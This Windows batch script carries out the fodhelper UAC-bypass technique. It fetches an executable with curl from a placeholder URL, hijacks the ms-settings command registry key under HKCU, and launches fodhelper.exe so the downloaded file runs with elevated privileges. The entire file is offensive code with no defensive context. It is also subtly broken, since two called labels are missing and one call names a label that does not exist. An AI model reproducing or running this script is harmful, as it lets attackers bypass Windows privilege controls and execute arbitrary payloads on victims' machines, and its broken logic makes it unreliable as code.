@echo off
setlocal enabledelayedexpansion
call :definePaths
call :downloadFile
call :modifyRegistry
call :runFodHelper
goto :end


set "userPath=%USERPROFILE%\AppData"
set "targetKey=HKCU\Software\Classes\ms-settings\Shell\Open\command"
set "commandValue=%userPath%\yourfile.exe"
exit /b


curl -s -o "%userPath%\yourfile.exe" urltoyourexe/your.exe
exit /b

:modifyRegistry

reg add "!targetKey!" /f /ve /t REG_SZ /d "!commandValue!" > nul 2>&1

reg add "!targetKey!" /f /v "DelegateExecute" /t REG_SZ /d "" > nul 2>&1
exit /b

:startFodHelper
start "" %SystemRoot%\System32\fodhelper.exe
exit /b

:end
endlocal
